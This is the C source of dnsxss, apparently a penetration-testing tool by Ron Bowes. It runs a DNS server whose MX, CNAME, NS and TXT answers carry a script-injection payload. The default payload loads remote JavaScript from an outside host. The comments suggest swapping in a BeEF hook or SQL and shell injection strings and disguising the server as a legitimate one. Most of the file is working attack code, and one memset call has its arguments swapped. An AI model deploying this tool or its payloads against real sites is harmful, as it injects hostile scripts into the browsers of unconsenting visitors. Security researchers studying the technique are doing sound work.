/** dnsxss.c
 * By Ron Bowes
 * December, 2009
 *
 * (See LICENSE.txt)
 *
 *==Intro==
 * [[dnsxss]] is designed to send back malicious responses to DNS queries in
 * order to test DNS lookup servers for common classes of vulnerabilities. 
 * By default, dnsxss returns a string containing some Javascript code to all
 * MX, CNAME, NS, and TEXT requests, in the hopes that the DNS lookup will be
 * displayed in a browser. 
 *
 * When I originally wrote this, I tested it on a handful of Internet sites.
 * Every one of them was vulnerable. 
 *
 * I haven't tried testing other vulnerabilities, like SQL injection or 
 * shell injection, but I suspect that this is a great attack vector for
 * those and other vulnerabilities, because people don't realize that malicious
 * traffic can be returned. 
 *
 *==Usage==
 *<pre>
 * ./dnsxss [-t <test string>]
 *  -a <address>
 *     The address sent back to the user when an A request is made. Can be used
 *     to disguise this as a legitimate DNS server. Default: 127.0.0.1.
 *  -aaaa <address>
 *     The address sent back to the user when an AAAA (IPv6) request is made. Can
 *     be used to disguise this as a legitimate DNS server. Default: ::1.
 *  -d <domain>
 *     The domain to put after the test string. It should be the same as the
 *     one that points to your host.
 *  -h
 *     Help
 *  --payload <data>
 *     The string containing the HTML characters, that will ultimately test for
 *     the cross-site scripting vulnerability. Ultimately, this can contain any
 *     type of attack, such as sql-injection. One thing to note is that DNS
 *     generally seems to filter certain characters; in my testing, anything with
 *     an ASCII code of 0x20 (Space) or lower was replaced with an escaped
 *     /xxx, and brackets had a backslash added before them.
 *     Default:
 *     <script src='http://www.skullsecurity.org/test-js.js'></script>
 *     Note that unless a TEXT record is requested, spaces are replaced with
 *     slashes ('/'), which work in Firefox but not IE.
 *  --keep-spaces
 *     By default, spaces in the payload are replaced with slashes ('/') because
 *     the DNS protocol doesn't like spaces. Use this flag to bypass that
 *     filter.
 *  --test <domain>
 *     Test to see if we are the authoritative nameserver for the given domain.
 *  -u --username
 *     The username to use when dropping privileges. Default: nobody.
 *  -s --source <address>
 *     The local address to bind to. Default: any (0.0.0.0)
 *  -p --port <port>
 *     The local port to listen on. I don't recommend changing this.
 *     default: 53
 *</pre>
 * 
--------------------------------------------------------------------------------
 *==Examples==
 * Running this program without arguments returns a pretty typical cross-site
 * scripting string:
 *<pre>
 * $ dig @localhost -t TXT test
 * [...]
 * ;; ANSWER SECTION:
 * test.                   1       IN      TXT     "<script src='http://www.skullsecurity.org/test-js.js'></script>.test"
 *</pre>
 *
 * This will display a messagebox on the user's screen alerting them to the
 * issue. You can change the payload using the --payload argument and point
 * it at, for example, a BeEF server.
 *
 *==Authoritative DNS server==
 * Many functions of this tool require you to be the authoritative nameserver
 * for a domain. This typically costs money, but is fairly cheap and has a lot
 * of benefits. If you aren't sure whether or not you're the authority, you
 * can use the --test argument to this program, or you can directly run the
 * [[dnstest]] program, also included. 
 *
 */

#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
#include <winsock2.h>
#else
#include <unistd.h>
#endif

#include "buffer.h"
#include "dns.h"
#include "memory.h"
#include "my_getopt.h"
#include "select_group.h"
#include "types.h"
#include "udp.h"

#define NAME "dnsxss"

typedef struct
{
	char *test_string; /* Response to standard queries (MX, CNAME, NS). */
	char *text_string; /* Response to text queries (TEXT). */

	int server_socket;
	select_group_t *select_group;
	char *user;
	NBBOOL keep_spaces;
	char *a;
#ifndef WIN32
	char *aaaa;
#endif
	char *source;
	int   port;
} settings_t;

/* We need this for catching signals. */
settings_t *global_settings = NULL;

static SELECT_RESPONSE_t dns_callback(void *group, int socket, uint8_t *packet, size_t packet_length, char *addr, uint16_t port, void *s)
{
	settings_t *settings = (settings_t*) s;
	uint16_t    i;
	uint8_t    *response_packet;
	uint32_t    response_packet_length;
	dns_t      *request;
	dns_t      *response;

	/* Parse the DNS packet. */
	request  = dns_create_from_packet(packet, packet_length);
	response = dns_create();

	response->trn_id = request->trn_id;
	response->flags  = 0x8000;

	for(i = 0; i < request->question_count; i++)
	{
		/* Grab the question. */
		question_t this_question = request->questions[i];

		/* Display the question. */
		fprintf(stderr, "Question %d: %s (0x%04x 0x%04x)\n", i, this_question.name, this_question.type, this_question.class);

		/* Echo back the question. */
		dns_add_question(response, this_question.name, this_question.type, this_question.class);

		/* Check if it's a request type that we handle. */
		if(this_question.type == DNS_TYPE_ANY ||
		   this_question.type == DNS_TYPE_TEXT ||
		   this_question.type == DNS_TYPE_CNAME ||
		   this_question.type == DNS_TYPE_NS ||
		   this_question.type == DNS_TYPE_MX)
		{
			/* Create a buffer. */
			buffer_t *answer = buffer_create(BO_NETWORK);
			char     *answer_str;

			/* Add the questions as well as the payload to the buffer to send back. */
			if(this_question.type == DNS_TYPE_ANY || this_question.type == DNS_TYPE_TEXT)
				buffer_add_string(answer, settings->text_string);
			else
				buffer_add_string(answer, settings->test_string);
			buffer_add_int8(answer, '.');
			buffer_add_ntstring(answer, this_question.name);
			answer_str = (char*)buffer_create_string_and_destroy(answer, NULL);

			fprintf(stderr, "Answer with: %s\n", answer_str);

			/* If they asked for ANY or TEXT, return a boobytrapped TEXT record; otherwise, see what we can do. */
			if(this_question.type == DNS_TYPE_ANY || this_question.type == DNS_TYPE_TEXT)
				dns_add_answer_TEXT(response, this_question.name, 0x0001, 0x00000001, (uint8_t *)answer_str, strlen((char*)answer_str));
			else if(this_question.type == DNS_TYPE_NS)
				dns_add_answer_NS(response, this_question.name, 0x0001, 0x00000001, (char*)answer_str);
			else if(this_question.type == DNS_TYPE_CNAME)
				dns_add_answer_CNAME(response,  this_question.name, 0x0001, 0x00000001, (char*)answer_str);
			else if(this_question.type == DNS_TYPE_MX)
				dns_add_answer_MX(response,	this_question.name, 0x0001, 0x00000001, 10, (char*)answer_str);

			safe_free(answer_str);
		}
		else
		{
			/* Reply with localhost for A/AAAA records. */
			if(this_question.type == DNS_TYPE_A || this_question.type == DNS_TYPE_ANY)
			{
				fprintf(stderr, "A request; responding with %s.\n", settings->a);
				dns_add_answer_A(response, this_question.name, 0x0001, 0x00000001, settings->a);
			}
#ifndef WIN32
			else if(this_question.type == DNS_TYPE_AAAA || this_question.type == DNS_TYPE_ANY)
			{
				fprintf(stderr, "AAAA request; responding with %s\n", settings->aaaa);
				dns_add_answer_AAAA(response,  this_question.name, 0x0001, 0x00000001, settings->aaaa);
			}
#endif
			else
			{
				fprintf(stderr, "Unknown request type: 0x%04x; ignoring.\n", this_question.type);
			}
		}
	}


	/* Send the response. */
	response_packet = dns_to_packet(response, &response_packet_length);
	udp_send(socket, addr, port, response_packet, response_packet_length);

	/* Free memory. */
	safe_free(response_packet);
	dns_destroy(response);
	dns_destroy(request);
	return SELECT_OK;

}

static void dns_poll(settings_t *s)
{
	/* Create the select group in 'settings' -- this is so we can free it on a signal. */
	s->select_group = select_group_create();

	/* Add the server socket. */
	select_group_add_socket(s->select_group, s->server_socket, SOCKET_TYPE_DATAGRAM, s);
	select_set_recv(s->select_group, s->server_socket, dns_callback);

	while(1)
		select_group_do_select(s->select_group, -1);

	select_group_destroy(s->select_group); /* Note: we don't get here. */
}

void cleanup(void)
{
	if(global_settings)
	{
		/* Free memory. */
		if(global_settings->select_group)
			select_group_destroy(global_settings->select_group);

		if(global_settings->test_string)
			safe_free(global_settings->test_string);

		safe_free(global_settings);
	}

	/* Print allocated memory. This will only run if -DTESTMEMORY is given. */
	print_memory();
}

void interrupt(int signal)
{
	/* Note: exiting like this will call the atexit() function, cleanup(). */
	fprintf(stderr, "punt!\n");
	exit(0);
}


static void usage(char *program)
{
	fprintf(stderr, NAME", by Ron Bowes <ron@skullsecurity.net>\n");
	fprintf(stderr, "\n");
	fprintf(stderr, "%s [--payload <test string>]\n", program);
	fprintf(stderr, " -a <address>\n");
	fprintf(stderr, "    The address sent back to the user when an A request is made. Can be used\n");
	fprintf(stderr, "    to disguise this as a legitimate DNS server. Default: 127.0.0.1.\n");
#ifndef WIN32
	fprintf(stderr, " -aaaa <address>\n");
	fprintf(stderr, "    The address sent back to the user when an AAAA (IPv6) request is made. Can\n");
	fprintf(stderr, "    be used to disguise this as a legitimate DNS server. Default: ::1.\n");
#endif
	fprintf(stderr, " -d <domain>\n");
	fprintf(stderr, "    The domain to put after the test string. It should be the same as the\n");
	fprintf(stderr, "    one that points to your host.\n");
	fprintf(stderr, " -h\n");
	fprintf(stderr, "    Help\n");
	fprintf(stderr, " --payload <data>\n");
	fprintf(stderr, "    The string containing the HTML characters, that will ultimately test for\n");
	fprintf(stderr, "    the cross-site scripting vulnerability. Ultimately, this can contain any\n");
	fprintf(stderr, "    type of attack, such as sql-injection. One thing to note is that DNS\n");
	fprintf(stderr, "    generally seems to filter certain characters; in my testing, anything with\n");
	fprintf(stderr, "    an ASCII code of 0x20 (Space) or lower was replaced with an escaped\n");
	fprintf(stderr, "    /xxx, and brackets had a backslash added before them.\n");
	fprintf(stderr, "    Default:\n");
	fprintf(stderr, "    <script src='http://www.skullsecurity.org/test-js.js'></script>\n");
	fprintf(stderr, "    Note that unless a TEXT record is requested, spaces are replaced with\n");
	fprintf(stderr, "    slashes ('/'), which work in Firefox but not IE.\n");
	fprintf(stderr, " --keep-spaces\n");
	fprintf(stderr, "    By default, spaces in the payload are replaced with slashes ('/') because\n");
	fprintf(stderr, "    the DNS protocol doesn't like spaces. Use this flag to bypass that\n");
	fprintf(stderr, "    filter.\n");
	fprintf(stderr, " --test <domain>\n");
	fprintf(stderr, "    Test to see if we are the authoritative nameserver for the given domain.\n");
	fprintf(stderr, " -u --username\n");
	fprintf(stderr, "    The username to use when dropping privileges. Default: nobody.\n");
	fprintf(stderr, " -s --source <address>\n");
	fprintf(stderr, "    The local address to bind to. Default: any (0.0.0.0)\n");
	fprintf(stderr, " -p --port <port>\n");
	fprintf(stderr, "    The local port to listen on. I don't recommend changing this.\n");
	fprintf(stderr, "    default: 53\n");
	fprintf(stderr, "\n");
	fprintf(stderr, "This program returns a string containing an HTML payload characters when it\n");
	fprintf(stderr, "receives a DNS query. The queries that return the payload are MX (Mail), \n");
	fprintf(stderr, "NS (Nameserver), CNAME (Alias), or TEXT (text) queries. This requires you to\n");
	fprintf(stderr, "either:\n");
	fprintf(stderr, "a) Be the authoritative server for your domain (I am, for example, the authority\n");
	fprintf(stderr, "   for skullseclabs.org)\n");
	fprintf(stderr, "b) Have the ability to choose which server the lookup happens at (in the same \n");
	fprintf(stderr, "   sense as 'dig @server <host>' can specify a server.\n");
	fprintf(stderr, "\n");
	fprintf(stderr, "To see if you're the authoritative nameserver, you can use the --test command.\n");
	fprintf(stderr, "For example, 'dnsxss --test skullseclabs.org'.\n");
	fprintf(stderr, "\n");
	fprintf(stderr, "Once you're running this server, you can test it's working with the following\n");
	fprintf(stderr, "command:\n");
	fprintf(stderr, "  dig @localhost -t MX test\n");
	fprintf(stderr, "\n");
	fprintf(stderr, "Under the 'ANSWER SECTION' you should see the script displayed. \n");
	fprintf(stderr, "\n");
	fprintf(stderr, "When a site tries to display this record back to you, it will inevitably, at\n");
	fprintf(stderr, "least in my tests, display the HTML back without filtering it. When that\n");
	fprintf(stderr, "happens, you have a cross-site scripting vulnerability on the site. What you\n");
	fprintf(stderr, "do next is up to you! \n");
	exit(1);
}

static void version()
{
	fprintf(stderr, "%s is part of %s\n", NAME, NBTOOL_NAME_VERSION);
	exit(0);
}

int main(int argc, char *argv[])
{
	settings_t *s = safe_malloc(sizeof(settings_t));
	char        c;
	int         option_index;
	const char *option_name;
	size_t      i;

	/* Build the long-options array for parsing the options. */
	struct option long_options[] =
	{
		/* General options. */
		{"a",           required_argument, 0, 0}, /* Help. */
#ifndef WIN32
		{"aaaa",        required_argument, 0, 0}, /* Help. */
#endif
		{"help",        no_argument,       0, 0}, /* Help. */
		{"h",           no_argument,       0, 0},
		{"H",           no_argument,       0, 0},
		{"keep-spaces", no_argument,       0, 0}, /* Keep spaces. */
		{"payload",     required_argument, 0, 0}, /* Payload. */
		{"port",        required_argument, 0, 0}, /* Local port. */
		{"p",           required_argument, 0, 0},
		{"source",      required_argument, 0, 0}, /* Source. */
		{"s",           required_argument, 0, 0},
		{"test",        required_argument, 0, 0}, /* Test the DNS authority. */
		{"username",    required_argument, 0, 0}, /* Username (for dropping privileges). */
		{"u",           required_argument, 0, 0},
		{"version",     no_argument,       0, 0}, /* Version. */
		{"V",           no_argument,       0, 0},

		{0, 0, 0, 0}
	};

	/* Initialize Winsock (if we're on Windows). */
	winsock_initialize();

	/* Get ready to randomize. */
	srand((unsigned int)time(NULL));

	/* Clear the settings. */
	memset(s, sizeof(s), 0);

	/* Set some defaults. */
	s->user          = "nobody";
	s->text_string   = "<script src='http://www.skullsecurity.org/test-js.js'></script>";
	s->a             = "127.0.0.1";
#ifndef WIN32
	s->aaaa          = "::1";
#endif
	s->port          = 53;
	s->source        = "0.0.0.0";

	/* Catch SIGINT. */
	signal(SIGINT, interrupt);

	/* Catch all exit events. */
	atexit(cleanup);

	/* Parse the commandline options. */
	opterr = 0;
	while((c = getopt_long_only(argc, argv, "", long_options, &option_index)) != EOF)
	{
		switch(c)
		{
			case 0:
				option_name = long_options[option_index].name;

				/* General options. */
				if(!strcmp(option_name, "a"))
				{
					s->a = optarg;
				}
#ifndef WIN32
				else if(!strcmp(option_name, "aaaa"))
				{
					s->aaaa = optarg;
				}
#endif
				else if(!strcmp(option_name, "help") || !strcmp(option_name, "h") || !strcmp(option_name, "H"))
				{
					usage(argv[0]);
				}
				else if(!strcmp(option_name, "keep-spaces"))
				{
					s->keep_spaces = TRUE;
				}
				else if(!strcmp(option_name, "payload"))
				{
					s->text_string = optarg;
				}
				else if(!strcmp(option_name, "port") || !strcmp(option_name, "p"))
				{
					s->port = atoi(optarg);
				}
				else if(!strcmp(option_name, "source") || !strcmp(option_name, "s"))
				{
					s->source = optarg;
				}
				else if(!strcmp(option_name, "test"))
				{
					dns_do_test(optarg); /* Doesn't return. */
				}
				else if(!strcmp(option_name, "username") || !strcmp(option_name, "u"))
				{
					s->user = optarg;
				}
				else if(!strcmp(option_name, "version") || !strcmp(option_name, "V"))
				{
					version();
				}
			break;

			case '?':
			default:
				fprintf(stderr, "Couldn't parse arguments\n\n");
				usage(argv[0]);
			break;
		}
	}

	/* Generate the non-TEXT query -- if we're keeping spaces, it's identical. */
	s->test_string = safe_strdup(s->text_string);
	if(!s->keep_spaces)
		for(i = 0; i < strlen(s->test_string); i++)
			if(s->test_string[i] == ' ')
				s->test_string[i] = '/';

#ifndef WIN32
	/* Check for the root user. */
	if(getuid() != 0)
		fprintf(stderr, "WARNING: If the bind() fails, please re-run as root (privileges will be dropped as soon as the socket is created).\n");
#endif

	/* Create a socket for the server. */
	s->server_socket = udp_create_socket(s->port, s->source);

	/* Drop privileges. */
	drop_privileges(s->user);

	/* Display what we're doing. */
	fprintf(stderr, "Listening for requests on %s:%d\n", s->source, s->port);
	fprintf(stderr, "Will response to queries with: %s\n", s->test_string);

	/* Set the global settings -- this lets us clean up when a signal is caught. */
	global_settings = s;

	/* Poll for data. */
	dns_poll(s);

	return 0;
}

